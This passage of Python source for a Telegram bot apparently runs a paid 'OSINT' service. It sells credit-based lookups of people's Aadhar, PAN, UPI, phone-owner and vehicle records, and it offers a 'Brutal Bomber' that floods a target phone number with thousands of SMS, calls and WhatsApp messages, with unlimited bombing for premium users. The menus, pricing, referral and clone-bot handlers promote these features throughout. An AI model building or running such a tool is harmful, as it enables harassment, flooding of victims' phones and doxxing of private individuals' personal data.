    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== CLONE BOTS ====================

@bot.message_handler(func=lambda m: m.text == "🤖 ᴄʟᴏɴᴇ ʙᴏᴛꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_clone_bots(m):
    uid = m.from_user.id
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute("SELECT user_id, token, status, requested_at FROM clone_bots ORDER BY id DESC LIMIT 10")
        clones = c.fetchall()
        conn.close()
        
        if not clones:
            text = "<b>🤖 Clone Bots</b>\n━━━━━━━━━━━━━━━━━━\n❌ No clone bots found."
        else:
            text = "<b>🤖 Clone Bots</b>\n━━━━━━━━━━━━━━━━━━\n"
            for c in clones:
                status_icon = "✅" if c[2] == "approved" else "⏳" if c[2] == "pending" else "❌"
                text += f"{status_icon} User: <code>{c[0]}</code>\n   Status: {c[2]}\n   Token: <code>{c[1][:20]}...</code>\n\n"
        bot.reply_to(m, format_message(text), parse_mode='HTML')
    except Exception as e:
        bot.reply_to(m, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')

# ==================== FEATURE COSTS ====================

@bot.message_handler(func=lambda m: m.text == "🔧 ꜰᴇᴀᴛᴜʀᴇ ᴄᴏꜱᴛꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_feature_costs(m):
    uid = m.from_user.id
    text = """
<b>🔧 Feature Costs</b>
━━━━━━━━━━━━━━━━━━
📱 Number Info: 1 credit
🆔 Aadhar Info: 1 credit
💳 UPI Info: 1 credit
📷 Instagram: 1 credit
🏦 IFSC Info: 1 credit
🚗 Vehicle Info: 1 credit
💼 GST Info: 1 credit
🪪 PAN Info: 1 credit
🇵🇰 Pak Num: 1 credit
📍 Pincode: 1 credit
🎮 Free Fire: 1 credit
💎 Hitek: 2 credits
🌟 Hitek Full: 2 credits
👤 TG User Info: 1 credit

💎 Premium users: Unlimited ❌
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== PREMIUM PRICES ====================

@bot.message_handler(func=lambda m: m.text == "💎 ᴩʀᴇᴍɪᴜᴍ ᴩʀɪᴄᴇꜱ" and is_admin(m.from_user.id) and not is_group(m))
def admin_premium_prices(m):
    uid = m.from_user.id
    text = """
<b>💎 Premium Prices</b>
━━━━━━━━━━━━━━━━━━
📅 <b>1 Day:</b> ₹40
📅 <b>7 Days:</b> ₹150
📅 <b>15 Days:</b> ₹280
📅 <b>30 Days:</b> ₹499

✨ <b>Premium Benefits:</b>
• Unlimited Searches
• No Credit Cost
• Unlimited Bomber Time
• All Features Unlocked

💳 Contact: Unknown
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== MAINTENANCE ====================

@bot.message_handler(func=lambda m: m.text == "🛠️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ" and is_admin(m.from_user.id) and not is_group(m))
def admin_maintenance(m):
    uid = m.from_user.id
    text = """
<b>🛠️ Maintenance Mode</b>
━━━━━━━━━━━━━━━━━━
🟢 <b>Status:</b> All features are ONLINE

📌 <b>Features:</b>
• Number Info ✅
• Aadhar Info ✅
• UPI Info ✅
• Instagram ✅
• IFSC ✅
• Vehicle ✅
• GST ✅
• PAN ✅
• Pak Num ✅
• Pincode ✅
• Free Fire ✅
• Hitek ✅
• Brutal Bomber ✅
• TG Username ✅
• TG ID ✅
• Hitek Full (Username/Number) ✅

🔑 <b>API Key:</b> MADX
📌 <b>Made by:</b> Unknown
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== MAIN MENU ====================

@bot.message_handler(func=lambda m: m.text == "🏠 ᴍᴀɪɴ ᴍᴇɴᴜ" and is_admin(m.from_user.id) and not is_group(m))
def admin_main_menu(m):
    uid = m.from_user.id
    admin_page[uid] = 1
    text = f"👋 <b>Main Menu</b>\n💰 <b>Credits:</b> <code>{get_credits(uid)}</code>"
    bot.send_message(uid, format_message(text), reply_markup=main_keyboard(uid))

# ==================== FEATURE HANDLERS ====================

@bot.message_handler(func=lambda m: m.text == "📱 ɴᴜᴍʙᴇʀ ɪɴꜰᴏ" and not is_group(m))
def number_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_number"
    bot.reply_to(m, format_message("<b>📱 Send mobile number:</b>\nExample: <code>9876543210</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🆔 ᴀᴀᴅʜᴀʀ ɪɴꜰᴏ" and not is_group(m))
def aadhar_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_aadhar"
    bot.reply_to(m, format_message("<b>🪪 Send 12-digit Aadhar:</b>\nExample: <code>327567544017</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💳 ᴜᴩɪ ɪɴꜰᴏ" and not is_group(m))
def upi_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_upi"
    bot.reply_to(m, format_message("<b>💳 Send UPI ID:</b>\nExample: <code>example@ybl</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "📷 ɪɴꜱᴛᴀɢʀᴀᴍ ɪɴꜰᴏ" and not is_group(m))
def instagram_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_instagram"
    bot.reply_to(m, format_message("<b>📷 Send Instagram username:</b>\nExample: <code>instagram</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🏦 ɪꜰꜱᴄ ɪɴꜰᴏ" and not is_group(m))
def ifsc_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_ifsc"
    bot.reply_to(m, format_message("<b>🏦 Send IFSC code:</b>\nExample: <code>SBIN0001234</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🚗 ᴠᴇʜɪᴄʟᴇ ɪɴꜰᴏ" and not is_group(m))
def vehicle_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_vehicle"
    bot.reply_to(m, format_message("<b>🚗 Send RC number:</b>\nExample: <code>MH12AB1234</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💼 ɢꜱᴛ ɪɴꜰᴏ" and not is_group(m))
def gst_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_gst"
    bot.reply_to(m, format_message("<b>💼 Send GST number:</b>\nExample: <code>10DJCPK4351Q1Z5</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🪪 ᴩᴀɴ ɪɴꜰᴏ" and not is_group(m))
def pan_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_pan"
    bot.reply_to(m, format_message("<b>🪪 Send PAN number:</b>\nExample: <code>AAMTS3432L</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🇵🇰 ᴩᴀᴋ ɴᴜᴍ ɪɴꜰᴏ" and not is_group(m))
def pak_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_pak"
    bot.reply_to(m, format_message("<b>🇵🇰 Send Pakistan number:</b>\nExample: <code>03001234567</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "📍 ᴩɪɴᴄᴏᴅᴇ ɪɴꜰᴏ" and not is_group(m))
def pincode_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_pincode"
    bot.reply_to(m, format_message("<b>📍 Send 6-digit pincode:</b>\nExample: <code>110001</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🎮 ꜰʀᴇᴇ ꜰɪʀᴇ ɪɴꜰᴏ" and not is_group(m))
def ff_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_ff"
    bot.reply_to(m, format_message("<b>🎮 Send Free Fire UID:</b>\nExample: <code>1234567890</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💎 ʜɪᴛᴇᴋ-ɴᴜᴍ-ɪɴꜰᴏ 👑" and not is_group(m))
def hitek_num_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_hitek_num"
    bot.reply_to(m, format_message("<b>💎 Send number for Hitek:</b>\nExample: <code>9876543210</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🌟 ʜɪᴛᴇᴋ-ꜰᴜʟʟ-ɪɴꜰᴏ 👑" and not is_group(m))
def hitek_full_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_hitek_full"
    bot.reply_to(m, format_message(
        "<b>🌟 Hitek Full Info</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Send <b>username</b> or <b>number</b>:\n"
        "• Username: <code>@username</code>\n"
        "• Number: <code>9876543210</code>\n\n"
        "💡 <b>Both username and number supported!</b>"
    ), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "👤 ꜱᴇʟᴇᴄᴛ ᴜꜱᴇʀ" and not is_group(m))
def select_user_btn(m):
    uid = m.from_user.id
    try:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton("👤 Select User", request_users=KeyboardButtonRequestUser(request_id=1, user_is_bot=False)))
        markup.add(KeyboardButton("🔙 Main Menu"))
        bot.send_message(uid, format_message("<b>👤 Click 'Select User' button:</b>"), reply_markup=markup, parse_mode='HTML')
    except Exception:
        bot.send_message(uid, format_message("<b>❌ Use /userid command instead.</b>"), parse_mode='HTML')

@bot.message_handler(content_types=['users_shared'])
def handle_user_shared(message):
    uid = message.from_user.id
    if not message.users_shared or not message.users_shared.user_ids:
        return
    
    raw_user_id = message.users_shared.user_ids[0]
    status = bot.reply_to(message, format_message("<b>⏳ Searching...</b>"), parse_mode='HTML')
    
    try:
        result = get_tg_user_info(raw_user_id)
        if result.get('success'):
            formatted = format_tg_user_result(result, raw_user_id)
            try:
                bot.edit_message_text(formatted, message.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(message.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'selected_userid', str(raw_user_id), result)
        else:
            bot.edit_message_text(format_message(f"<b>❌ {result.get('msg', 'User not found')}</b>"), message.chat.id, status.message_id, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(format_message(f"<b>❌ Error: {e}</b>"), message.chat.id, status.message_id, parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🔍 ᴜꜱᴇʀɴᴀᴍᴇ ɪɴꜰᴏ" and not is_group(m))
def username_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_username"
    bot.reply_to(m, format_message(
        "<b>🔍 Telegram Username Info</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Send username with <b>@</b> or without:\n"
        "• <code>@username</code>\n"
        "• <code>username</code>\n\n"
        "💡 <b>Both username and ID supported!</b>"
    ), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🆔 ᴛɢ ɪᴅ ɪɴꜰᴏ" and not is_group(m))
def userid_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_userid"
    bot.reply_to(m, format_message(
        "<b>🆔 Telegram ID Info</b>\n━━━━━━━━━━━━━━━━━━\n"
        "Send <b>numeric ID</b> or <b>username</b>:\n"
        "• ID: <code>6443754454</code>\n"
        "• Username: <code>@username</code>\n\n"
        "💡 <b>Both username and ID supported!</b>"
    ), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💰 ʙᴀʟᴀɴᴄᴇ" and not is_group(m))
def balance_btn(m):
    uid = m.from_user.id
    credits = get_credits(uid)
    refs = get_referral_count(uid)
    money = get_money(uid)
    text = f"""
<b>💰 ʙᴀʟᴀɴᴄᴇ</b>
<b>₹ ᴍᴏɴᴇʏ:</b> <code>₹{money}</code>
<b>💎 ᴄʀᴇᴅɪᴛꜱ:</b> <code>{credits}</code>
<b>👥 ʀᴇꜰᴇʀʀᴀʟꜱ:</b> <code>{refs}</code>
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🎁 ᴅᴀɪʟʏ ᴄʟᴀɪᴍ" and not is_group(m))
def daily_btn(m):
    uid = m.from_user.id
    if claim_daily(uid):
        credits = get_credits(uid)
        bot.reply_to(m, format_message(f"<b>✅ +{DAILY_CREDITS} credits!</b>\n💰 Total: <code>{credits}</code>"), parse_mode='HTML')
    else:
        bot.reply_to(m, format_message("<b>❌ Already claimed!</b>\n⏳ Come back tomorrow."), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "👥 ʀᴇꜰᴇʀʀᴀʟꜱ" and not is_group(m))
def referral_btn(m):
    uid = m.from_user.id
    count = get_referral_count(uid)
    link = f"https://t.me/{bot.get_me().username}?start={uid}"
    credits = get_credits(uid)
    text = f"""
<b>👥 ʀᴇꜰᴇʀʀᴀʟꜱ</b>
<b>📊 Total:</b> <code>{count}</code>
<b>🔗 Your Link:</b>
<code>{link}</code>
<b>🎁 Per Referral:</b> <code>+{REFERRAL_CREDITS}</code>
<b>💰 Your Credits:</b> <code>{credits}</code>
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🎫 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ" and not is_group(m))
def redeem_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_redeem"
    bot.reply_to(m, format_message("<b>🎫 Send redeem code:</b>\nExample: <code>OSINT-ABCD</code>"), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💎 ᴩʀᴇᴍɪᴜᴍ" and not is_group(m))
def premium_btn(m):
    uid = m.from_user.id
    user = get_user(uid)
    is_prem = False
    if user and user[7] == 1 and user[8]:
        try:
            until = datetime.strptime(user[8], "%Y-%m-%d %H:%M:%S")
            if until > datetime.now():
                is_prem = True
        except Exception:
            pass
    
    if is_prem:
        text = f"<b>💎 Premium Active!</b>\n⏳ Expires: <code>{user[8][:10]}</code>"
    else:
        text = """
<b>💎 ᴩʀᴇᴍɪᴜᴍ</b>
━━━━━━━━━━━━━━━━━━
✨ Unlimited Searches
✨ No Credit Cost
✨ Unlimited Bomber Time
✨ All Features Unlocked

💳 Contact: Unknown
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== PURCHASE PREMIUM ====================

PREMIUM_PLANS = [(30, 499), (15, 280), (7, 150), (1, 40)]

@bot.message_handler(func=lambda m: m.text == "💳 ᴩᴜʀᴄʜᴀꜱᴇ ᴩʀᴇᴍɪᴜᴍ" and not is_group(m))
def purchase_premium_btn(m):
    uid = m.from_user.id
    money = get_money(uid)
    
    markup = InlineKeyboardMarkup()
    plan_labels = {30: "1 Month", 15: "15 Days", 7: "7 Days", 1: "1 Day"}
    for days, price in PREMIUM_PLANS:
        markup.add(InlineKeyboardButton(f"📅 {plan_labels.get(days, days)} — ₹{price}", callback_data=f"buy_prem_{days}_{price}"))
    
    text = f"""
<b>💳 ᴩᴜʀᴄʜᴀꜱᴇ ᴩʀᴇᴍɪᴜᴍ</b>
━━━━━━━━━━━━━━━━━━
₹ ʏᴏᴜʀ ʙᴀʟᴀɴᴄᴇ: <b>₹{money}</b>

<b>🛒 ꜱᴇʟᴇᴄᴛ ᴀ ᴩʟᴀɴ:</b>
"""
    bot.reply_to(m, format_message(text), reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_prem_"))
def cb_buy_premium(c):
    uid = c.from_user.id
    parts = c.data.split("_")
    try:
        days = int(parts[2])
        price = int(parts[3])
    except Exception:
        bot.answer_callback_query(c.id, "❌ Error!")
        return
    
    money = get_money(uid)
    if money < price:
        needed = price - money
        bot.answer_callback_query(c.id, f"❌ ₹{needed} aur chahiye!", show_alert=True)
        return
    
    user = get_user(uid)
    now_dt = datetime.now()
    start_from = now_dt
    if user and user[7] == 1 and user[8]:
        try:
            existing = datetime.strptime(user[8], "%Y-%m-%d %H:%M:%S")
            if existing > now_dt:
                start_from = existing
        except Exception:
            pass
    
    remove_money(uid, price)
    until = start_from + timedelta(days=days)
    until_str = until.strftime("%Y-%m-%d %H:%M:%S")
    
    conn = sqlite3.connect('bot.db', timeout=5)
    c_cur = conn.cursor()
    c_cur.execute("UPDATE users SET is_premium=1, premium_until=? WHERE user_id=?", (until_str, uid))
    conn.commit()
    conn.close()
    
    new_money = get_money(uid)
    plan_names = {30: "1 Month", 15: "15 Days", 7: "7 Days", 1: "1 Day"}
    plan_name = plan_names.get(days, f"{days} Days")
    
    bot.edit_message_text(
        format_message(
            f"<b>✅ Premium Activated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📅 Plan: {plan_name}\n"
            f"⏳ Expires: <code>{until_str}</code>\n"
            f"₹ Remaining: <code>₹{new_money}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✨ Enjoy Unlimited Features! 🎉"
        ),
        c.message.chat.id, c.message.message_id, parse_mode='HTML'
    )
    bot.answer_callback_query(c.id, f"✅ Premium for {days} days!")

# ==================== CLONE BOT ====================

CLONE_BOT_REFERRALS_NEEDED = 20

@bot.message_handler(func=lambda m: m.text == "🤖 ᴄʟᴏɴᴇ ʙᴏᴛ" and not is_group(m))
def clonebot_btn(m):
    uid = m.from_user.id
    refs = get_referral_count(uid)
    
    if is_admin(uid):
        refs = CLONE_BOT_REFERRALS_NEEDED
    
    if refs < CLONE_BOT_REFERRALS_NEEDED:
        needed = CLONE_BOT_REFERRALS_NEEDED - refs
        bar_done = int((refs / CLONE_BOT_REFERRALS_NEEDED) * 10)
        bar = "█" * bar_done + "░" * (10 - bar_done)
        text = f"""
<b>🤖 Clone Bot</b>
━━━━━━━━━━━━━━━━━━
📊 Progress: [{bar}] {refs}/{CLONE_BOT_REFERRALS_NEEDED}
❌ Still needed: <b>{needed} more referrals</b>

👥 Refer karo aur apna bot pao! 🎉
"""
        bot.reply_to(m, format_message(text), parse_mode='HTML')
        return
    
    text = f"""
<b>🤖 Clone Bot</b>
━━━━━━━━━━━━━━━━━━
✅ Congratulations! {refs} referrals complete!

📝 Apna <b>Bot Token</b> bhejo:
1️⃣ @BotFather pe jao
2️⃣ /newbot command use karo
3️⃣ Bot banao aur token copy karo
4️⃣ Token yahan paste karo

<i>Example: 1234567890:ABCdef...</i>
"""
    msg = bot.reply_to(m, format_message(text), parse_mode='HTML')
    bot.register_next_step_handler(msg, process_clone_token)

def process_clone_token(m):
    uid = m.from_user.id
    token = m.text.strip() if m.text else ''
    
    if not token or ':' not in token or len(token) < 30:
        bot.send_message(uid, format_message("<b>❌ Invalid token!</b>"), parse_mode='HTML')
        return
    
    try:
        conn = sqlite3.connect('bot.db', timeout=5)
        c = conn.cursor()
        c.execute(
            "INSERT OR REPLACE INTO clone_bots (user_id, token, status, requested_at) VALUES (?,?,?,?)",
            (uid, token, 'pending', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        conn.close()
    except Exception as e:
        bot.send_message(uid, format_message(f"<b>❌ Error: {e}</b>"), parse_mode='HTML')
        return
    
    bot.send_message(uid, format_message(
        "<b>✅ Clone request sent!</b>\n"
        "Admin approve karte hi bot start ho jayega!"
    ), parse_mode='HTML')

# ==================== MY HISTORY ====================

@bot.message_handler(func=lambda m: m.text == "📋 ᴍʏ ʜɪꜱᴛᴏʀʏ" and not is_group(m))
def my_history_btn(m):
    uid = m.from_user.id
    
    conn = sqlite3.connect('bot.db', timeout=5)
    c = conn.cursor()
    try:
        searches = c.execute("SELECT search_type, query, search_date FROM search_history WHERE user_id=? ORDER BY search_date DESC LIMIT 5", (uid,)).fetchall()
        bomber = c.execute("SELECT target_number, sms_sent, calls_sent, status, started_at FROM bomber_history WHERE user_id=? ORDER BY id DESC LIMIT 3", (uid,)).fetchall()
        total_searches = c.execute("SELECT COUNT(*) FROM search_history WHERE user_id=?", (uid,)).fetchone()[0]
    except Exception:
        searches = []
        bomber = []
        total_searches = 0
    finally:
        conn.close()
    
    text = f"<b>📋 My History</b>\n━━━━━━━━━━━━━━━━━━\n📊 Total Searches: <code>{total_searches}</code>\n━━━━━━━━━━━━━━━━━━\n"
    
    if searches:
        text += "<b>🔍 Recent Searches:</b>\n"
        for stype, query, sdate in searches:
            icon = '📱' if 'number' in stype else '🆔' if 'aadhar' in stype else '📷' if 'instagram' in stype else '🔍'
            text += f"{icon} <code>{query[:20]}</code> | {sdate[:10]}\n"
    else:
        text += "<i>No search history</i>\n"
    
    if bomber:
        text += "\n<b>💣 Recent Bombs:</b>\n"
        for num, sms, calls, status, started in bomber:
            icon = '✅' if status == 'done' else '🛑'
            text += f"{icon} <code>{num}</code> | SMS:{sms} Calls:{calls}\n"
    
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== MY API KEYS ====================

@bot.message_handler(func=lambda m: m.text == "🔑 ᴍʏ ᴀᴩɪ ᴋᴇʏꜱ" and not is_group(m))
def my_api_keys_btn(m):
    uid = m.from_user.id
    text = f"""
<b>🔑 My API Keys</b>
━━━━━━━━━━━━━━━━━━
💡 API keys generate karne ke liye admin se contact karo.
📌 Contact: Unknown
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== BRUTAL BOMBER ====================

@bot.message_handler(func=lambda m: m.text == "💣 ʙᴏᴍʙᴇʀ" and not is_group(m))
def bomber_menu_btn(m):
    uid = m.from_user.id
    
    user = get_user(uid)
    is_prem = False
    if user and user[7] == 1 and user[8]:
        try:
            until = datetime.strptime(user[8], "%Y-%m-%d %H:%M:%S")
            if until > datetime.now():
                is_prem = True
        except Exception:
            pass
    if uid == OWNER_ID:
        is_prem = True
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("💣 ʙʀᴜᴛᴀʟ ʙᴏᴍʙ"),
        KeyboardButton("💎 ᴩʀᴇᴍɪᴜᴍ ʙᴏᴍʙ" if is_prem else "💎 ᴩʀᴇᴍɪᴜᴍ ʙᴏᴍʙ 🔒")
    )
    markup.add(KeyboardButton("🔙 ᴍᴀɪɴ ᴍᴇɴᴜ"))
    
    bot.reply_to(m, format_message(
        f"<b>💣 ʙᴏᴍʙᴇʀ ᴍᴇɴᴜ</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💣 Brutal Bomber — <b>{len(ALL_APIS)}+ APIS</b>, <b>5 MINUTES</b>\n"
        f"🎯 <b>Targets:</b> 5000 SMS | 1000 Calls | 500 WhatsApp\n"
        f"💎 Premium Bomber — <b>UNLIMITED</b> (Premium only)\n"
        f"🔑 <b>API Key:</b> <code>MADX</code>\n"
        f"🛑 <b>Stop:</b> Inline button se stop karo!"
    ), reply_markup=markup, parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💣 ʙʀᴜᴛᴀʟ ʙᴏᴍʙ" and not is_group(m))
def brutal_bomb_btn(m):
    uid = m.from_user.id
    user_state[uid] = "waiting_brutal_bomb"
    bot.reply_to(m, format_message(
        "<b>💣 ʙʀᴜᴛᴀʟ ʙᴏᴍʙᴇʀ</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "📱 <b>Target number (10 digits):</b>\n"
        "<i>Example: 9876543210</i>\n\n"
        f"⚡ <b>{len(ALL_APIS)}+ APIs</b>\n"
        f"⏱️ <b>5 MINUTES</b> continuous bombing!\n"
        f"🎯 <b>Targets:</b> 5000 SMS | 1000 Calls | 500 WhatsApp\n"
        "🔑 <b>Key:</b> <code>MADX</code>\n"
        "🛑 <b>Stop:</b> Inline button se stop karo!\n"
        "⚠️ <b>Sirf apna number!</b>"
    ), parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💎 ᴩʀᴇᴍɪᴜᴍ ʙᴏᴍʙ" and not is_group(m))
def premium_bomb_btn(m):
    uid = m.from_user.id
    
    user = get_user(uid)
    is_prem = False
    if user and user[7] == 1 and user[8]:
        try:
            until = datetime.strptime(user[8], "%Y-%m-%d %H:%M:%S")
            if until > datetime.now():
                is_prem = True
        except Exception:
            pass
    if uid == OWNER_ID:
        is_prem = True
    
    if not is_prem:
        bot.reply_to(m, format_message(
            "<b>💎 Premium Required!</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Premium Bomber sirf Premium users ke liye!"
        ), parse_mode='HTML')
        return
    
    user_state[uid] = "waiting_premium_bomb"
    bot.reply_to(m, format_message(
        "<b>💎 Premium Bomber</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "📱 <b>Target number (10 digits):</b>\n"
        "<i>Example: 9876543210</i>\n\n"
        f"⚡ <b>{len(ALL_APIS)}+ APIs</b>\n"
        f"⏱️ <b>UNLIMITED</b> (Premium)\n"
        f"🎯 <b>Targets:</b> 5000 SMS | 1000 Calls | 500 WhatsApp\n"
        "🔑 <b>Key:</b> <code>MADX</code>\n"
        "🛑 <b>Stop:</b> Inline button se stop karo!\n"
        "⚠️ <b>Sirf apna number!</b>"
    ), parse_mode='HTML')

# ==================== HELP ====================

@bot.message_handler(func=lambda m: m.text == "ℹ️ ʜᴇʟᴩ" and not is_group(m))
def help_btn(m):
    text = f"""
<b>ℹ️ Help & Guide</b>
━━━━━━━━━━━━━━━━━━
📱 Number Info — Mobile owner, operator
🆔 Aadhar Info — 12-digit Aadhar details
💳 UPI Info — UPI ID details
📷 Instagram Info — Username info
🏦 IFSC Info — Bank branch details
🚗 Vehicle Info — RC number details
💼 GST Info — GST number details
🪪 PAN Info — PAN card details
🇵🇰 Pak Num Info — Pakistan number
📍 Pincode Info — 6-digit pincode
🎮 Free Fire Info — FF UID details
🔍 Username Info — Telegram username
🆔 TG ID Info — Telegram numeric ID
💎 Hitek Num — Advanced number lookup
🌟 Hitek Full — Deep search (Username/Number)
💣 Brutal Bomber — <b>{len(ALL_APIS)}+ APIs</b>, 5 MINUTES!
   🎯 5000 SMS | 1000 Calls | 500 WhatsApp

💰 Credits: Daily claim + Referrals
💎 Premium: Unlimited access + Unlimited Bomber
💾 Cache: All searches saved for future
🔑 API Key: MADX
🛑 Stop Bomber: Inline button se stop!

👑 Made by: Unknown
"""
    bot.reply_to(m, format_message(text), parse_mode='HTML')

# ==================== TEXT INPUT ====================

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

@bot.message_handler(func=lambda m: m.from_user and m.from_user.id in user_state and not is_group(m))
def handle_text_input(m):
    uid = m.from_user.id
    state = user_state[uid]
    text = m.text.strip()
    
    if not text:
        return
    
    # ========== NUMBER ==========
    if state == "waiting_number":
        clean = re.sub(r'[^\d]', '', text)
        if len(clean) < 10:
            bot.reply_to(m, format_message("<b>❌ Invalid number! Send 10-digit.</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_number_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_number_info_bold(result, clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'number', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== AADHAR ==========
    elif state == "waiting_aadhar":
        clean = re.sub(r'\s+', '', text)
        if not re.match(r'^\d{12}$', clean):
            bot.reply_to(m, format_message("<b>❌ Invalid Aadhar! 12 digits.</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_aadhar_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_aadhar_result_bold(result, clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'aadhar', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== UPI ==========
    elif state == "waiting_upi":
        if '@' not in text:
            bot.reply_to(m, format_message("<b>❌ Invalid UPI ID! Must contain @</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_upi_info(text)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_upi_result_bold(result, text)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'upi', text, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== INSTAGRAM ==========
    elif state == "waiting_instagram":
        clean = text.replace('@', '').strip()
        if len(clean) < 2:
            bot.reply_to(m, format_message("<b>❌ Invalid username!</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching Instagram...</b>"), parse_mode='HTML')
        result = get_instagram_info(clean)
        user_state.pop(uid, None)
        
        if result and result.get('success'):
            formatted = format_generic_result(result, "📷 Instagram Info", "👤 Username", clean)
            try:
                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
            except Exception:
                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
            save_search_history(uid, 'instagram', clean, result)
        else:
            msg = result.get('msg', 'No data found')
            bot.edit_message_text(format_message(f"<b>❌ {msg}</b>"), m.chat.id, status.message_id, parse_mode='HTML')
    
    # ========== IFSC ==========
    elif state == "waiting_ifsc":
        clean = text.upper().strip()
        if len(clean) != 11:
            bot.reply_to(m, format_message("<b>❌ Invalid IFSC! 11 characters.</b>"), parse_mode='HTML')
            return
        
        status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
        result = get_ifsc_info(clean)
        user_state.pop(uid, None)
        
